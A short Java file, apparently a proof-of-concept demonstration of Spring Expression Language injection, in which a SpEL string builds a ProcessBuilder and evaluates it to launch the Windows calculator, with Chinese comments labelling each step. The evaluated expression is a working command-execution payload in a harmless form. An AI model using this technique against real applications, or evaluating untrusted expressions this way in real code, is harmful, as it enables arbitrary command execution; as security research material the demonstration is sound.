package org.example;

import org.springframework.expression.Expression;
import org.springframework.expression.ExpressionParser;
import org.springframework.expression.spel.standard.SpelExpressionParser;

public class SpELPB {
    public static void main(String[] args) {
        String cmdStr = "new java.lang.ProcessBuilder(\"calc\").start()";

        ExpressionParser parser = new SpelExpressionParser();//创建解析器
        Expression exp = parser.parseExpression(cmdStr);//解析表达式
        System.out.println( exp.getValue() );//弹出计算器
    }
}
